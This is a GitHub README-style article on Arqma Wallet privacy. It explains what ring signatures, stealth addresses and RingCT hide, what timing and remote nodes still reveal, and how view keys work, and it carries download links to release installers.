![Arqma Wallet](assets/banner-article.png)

<h1 align="center">Arqma Wallet privacy: what is hidden on chain and what is not</h1>

<p align="center">What the chain reveals, what the node sees, and where KYC enters.</p>

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="assets/button-windows.png"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="assets/platform-windows.png"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

Arqma uses three privacy primitives at the protocol level: ring signatures, one-time stealth addresses and RingCT. Together they obscure who signed a transfer, where it went and how much it carried. What they do not touch is the network layer, where a remote node still sees that a wallet is active.

## The three primitives, one at a time

Each answers a different question about a transaction, and it is easier to reason about privacy when they are kept apart.

A ring signature answers "who authorised this?". The spender's input is presented as one of a set, so the signature does not single out which member signed.

A one-time stealth address answers "where did it go?". A payment is directed to an address generated for that payment, so the address you published is not the address that appears in the record.

RingCT answers "how much?". The amount is obscured rather than written in the clear.

This family of primitives is shared ground with other privacy chains, which is why readers arrive looking for a comparison. [Arqma Wallet comparison](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-vs-monero.md) states the Arqma side against verified facts and leaves the other column to its own documentation.

## What a ring signature changes about a transfer

In a system without ring signatures, an input names exactly the output being spent, and the link between one payment and the next is explicit. With them, the input refers to a set of possible origins, and the signature proves the spender controls one of them without revealing which.

The practical consequence is that the record no longer states, by itself, that output A funded input B. It states that one of several outputs did.

## What a stealth address changes

If payments arrived at the address you published, that address would become a permanent label for everything sent to it. A one-time address removes that: the destination in the record is generated per payment, so payments to the same published address do not appear as a group.

This is also why an address is safe to publish in the sense that matters  -  knowing it gives no ability to spend, and the record does not simply accumulate at it. [Arqma Wallet address format](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-address-format.md) covers what the 95-character form guarantees on its own.

## What RingCT changes

Amounts become part of the same problem as identities: a transfer whose value is written in the clear can be matched to other transfers by value alone.

RingCT obscures the amount, which removes that matching route from the record itself. It does not make the transaction invisible  -  the chain still has an entry, with a fee and a position in a block.

## What is not hidden

Three things remain visible, and honesty about them is more useful than a slogan.

The first is timing. A block has a height and a time, and a transaction sits in one. Two transfers in the same block, or a pattern of activity across blocks, are observable facts.

The second is the network layer. The default connection is a remote node, and a local node is documented as the only setup where no third party sees network activity. [Arqma remote node safety](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-remote-node-safety.md) covers what that observer can and cannot do.

The third is anything you publish yourself: an address you post, a payment you describe, a screenshot you share. None of those are protocol events  -  they are disclosures, and the record keeps them exactly as given.

## View keys and selective disclosure

View keys exist so that a wallet's history can be shown to someone without handing over the ability to spend. That is the documented purpose: optional selective disclosure.

The application's view-only restore path is the same idea in the software: a wallet can be rebuilt from a view key, and it can read history without being able to send. [Arqma Wallet restore from seed](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-restore-from-seed.md) sets that path beside the seed path.

A view key is therefore the right instrument when someone needs to verify a balance  -  an auditor, a counterparty, a record  -  and the wrong one to treat as a backup, because it cannot move anything.

## What the software itself reports

The wallet carries no telemetry, no analytics SDK and no advertising SDK, and the project operates no service that sees balances. There is no account, no email and no KYC step inside the software.

The current release from the [Arqma Wallet v0.5.1.2 release](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2) is the build those statements describe: no telemetry, no analytics SDK, no advertising SDK.

That matters because it removes a whole category of leak that exists in wallets built around an account. There is no login event to correlate, no device identifier sent to a vendor, no usage stream to join against anything else.

## Where the chain and the wallet differ

A useful way to hold the two together: the chain is public and permanent, and the primitives make it hard to read; the wallet is private to you and reports nothing; and the node in between is the one place where activity is visible to somebody else.

Privacy in this system is therefore not one setting but the sum of those three, and the third is the one a user can actually change, by running a node or by accepting the default.

Stated the other way round: the primitives are properties of the protocol and apply whether or not anyone enables them, while the network layer is a configuration choice and applies only to the machine making it. Two wallets with identical settings can therefore differ in what an observer sees, purely because one of them runs `arqmad` on the same machine.

## Privacy beyond the transaction

Two failures outside the protocol undo most of what the primitives achieve: a seed phrase recorded somewhere it can be read, and a habit of publishing which address belongs to which payment.

The first is the larger one, because a phrase is the wallet. It is displayed once at creation and cannot be exported, so wherever it was recorded is the entire exposure. [exposed Arqma seed phrase](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-someone-has-your-seed-phrase.md) covers the response if that record is compromised.

The second is subtle: linking an address to a person defeats a one-time address only if the payment is described somewhere. That is a habit rather than a protocol property.

## Cold storage and the network layer

The desktop wallet on an offline machine is the documented equivalent of cold storage, since there is no hardware-wallet flow in the current builds. An offline machine has no node connection at all, so the network layer contributes nothing to its exposure.

That is the strongest form of the third point above: no remote node, no observer, no timing correlation from the client side. [Arqma Wallet cold storage](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-cold-storage.md) covers what such a setup can and cannot do in practice.

## FAQ

### Is Arqma anonymous?

The chain uses ring signatures, one-time addresses and RingCT to obscure sender, recipient and amount. Timing and network-level observation remain visible.

### What does a view key reveal?

A wallet's history and balance, without the ability to send. It is the disclosure instrument, not a backup.

### Does the wallet send telemetry?

No. There is no telemetry, no analytics and no account, so the node connection is the only external relationship.

### Can a remote node see my transactions?

It sees that a client is active and from which network address. A local node is the only setup where no third party sees network activity.

### Does a hardware wallet improve privacy?

There is no hardware-wallet flow in the current builds; the offline desktop wallet is the documented alternative.

---

## Download Arqma Wallet

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="assets/button-windows.png"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="assets/platform-windows.png"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

---

## Related Arqma Wallet guides

| Guide | What it answers |
| --- | --- |
| [Arqma Wallet seed phrase guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-seed-phrase.md) | The 25 words, what they regenerate, and the one moment they are shown. |
| [Arqma remote node safety](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-remote-node-safety.md) | What a remote node operator can observe, and when a local node is worth it. |
| [Arqma Wallet cold storage](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-cold-storage.md) | Holding ARQ offline with the desktop wallet and a machine kept off the network. |
| [the Arqma web wallet](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-web-wallet.md) | What the old web wallet was, why it closed and where those coins sit. |
